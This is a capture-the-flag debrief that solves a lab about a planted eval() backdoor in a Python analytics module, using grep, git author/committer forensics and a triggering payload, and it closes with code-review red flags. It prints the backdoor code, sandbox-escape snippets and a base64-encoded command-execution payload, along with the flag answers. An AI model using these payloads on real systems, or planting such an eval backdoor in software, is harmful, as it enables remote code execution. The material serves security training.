# DEBRIEF: The Mole

## Solutions

### Flag 1: Find the Backdoor File
```bash
cd /tmp/boss_the_mole

# Method 1: Look for suspicious patterns
grep -r "eval\|exec\|compile\|__import__" app/
# Found in: app/analytics.py — eval() with user-supplied input!

# Method 2: Look for base64 (common obfuscation)
grep -r "base64" app/
# Found in: app/analytics.py

# Method 3: Check what was added in each commit
git log --oneline --stat
# The analytics commit adds a new file at an unusual time (23:45)
```
**FLAG{the_backdoor_is_in_app_analytics_py}** (implicit — finding the file)

### Flag 2: Understand What It Does
The backdoor is in `_apply_custom_transform()`:
```python
expression = base64.b64decode(transform).decode('utf-8')
result = eval(expression, {"__builtins__": {}}, context)
```

This accepts a Base64-encoded string from the user and **evaluates it as Python code**!

The `{"__builtins__": {}}` sandbox is trivially bypassable:
```python
# Bypass the sandbox:
__import__('os').system('whoami')
# Via context manipulation:
().__class__.__bases__[0].__subclasses__()  # enumerate available classes
```

**FLAG{eval_is_always_a_backdoor_in_disguise}** (found in the code comment)

### Flag 3: Find the Mole
```bash
# Check all commit authors AND committers
git log --format="%H %an <%ae> | committer: %cn <%ce>" 

# The analytics commit shows:
# Author: Alex Petrov <alex.dev@company.internal>
# Committer: Alex Petrov <shadow0ps@proton.me>  ← DIFFERENT EMAIL!

# The mole forgot that git stores BOTH author and committer!
git show --format=fuller <commit_hash_of_analytics>
```
**FLAG{git_committer_email_reveals_shadow0ps_at_proton}**

### Flag 4: Trigger the Backdoor
```bash
# The backdoor accepts base64-encoded Python in the "transform" field
# Encode a command:
echo -n "__import__('os').popen('echo FLAG{remote_code_execution_via_analytics_endpoint}').read()" | base64

# Send it (simulated):
python3 -c "
import base64, json, sys
sys.path.insert(0, '/tmp/boss_the_mole')
from app.analytics import process_analytics

payload = base64.b64encode(b'str(42 * 1337)').decode()
result = process_analytics({
    'format': 'custom',
    'data': {
        'transform': payload,
        'context': {}
    }
})
print(result)
# {'result': '56154', 'type': 'custom_metric'}
"
```
**FLAG{remote_code_execution_via_analytics_endpoint}**

## Mental Model: Code Review for Backdoors

```
BACKDOOR RED FLAGS:
├── eval() / exec() with ANY external input
├── base64.b64decode() → eval/exec pipeline  
├── Unusual commit times (23:45 on a Friday)
├── Commit message mentions closing a ticket nobody remembers
├── Author ≠ Committer in git metadata
├── "Flexible" or "custom" processing that accepts code-like input
├── Sandbox bypasses: {"__builtins__": {}} is NOT secure
└── Functions that do more than their name suggests

GIT FORENSICS TOOLKIT:
├── git log --format=fuller         — shows BOTH author and committer
├── git log --all --oneline --graph — visualize history
├── git diff <commit>^..<commit>    — see exactly what changed
├── git blame <file>                — who wrote each line
├── git log --author="pattern"      — filter by author
├── git show <commit>               — full commit details
└── git log --since="2024-03-01" --until="2024-03-15"  — date range

WHY eval() IS ALWAYS A VULNERABILITY:
  eval() executes ARBITRARY CODE from a string.
  If that string comes from user input (even indirectly), 
  the user can execute ANY code on your server.
  
  "But I removed __builtins__!" — Doesn't matter:
  ().__class__.__bases__[0].__subclasses__()[X]  
  ...can access os, subprocess, etc. through Python's type hierarchy.
  
  NEVER use eval() with external input. Alternatives:
  - ast.literal_eval() for safe literal parsing
  - json.loads() for structured data
  - A proper expression parser (pyparsing, lark)
  - Predefined function dispatch (map strings to functions)
```

## Real-World Parallels
- SolarWinds (2020): Backdoor hidden in legitimate update mechanism
- Event-Stream (2018): npm package had obfuscated crypto-stealing code
- Webmin (2019): Backdoor in source code repo for over a year
- Linux kernel (2003): Attempted backdoor via `==` instead of `=` in a check

## Skills Demonstrated
- Security-focused code review
- Git forensics (author vs committer, timestamps, commit patterns)
- Understanding code injection vulnerabilities
- Python sandbox escape knowledge
- Attack surface identification
- Thinking like both attacker AND defender
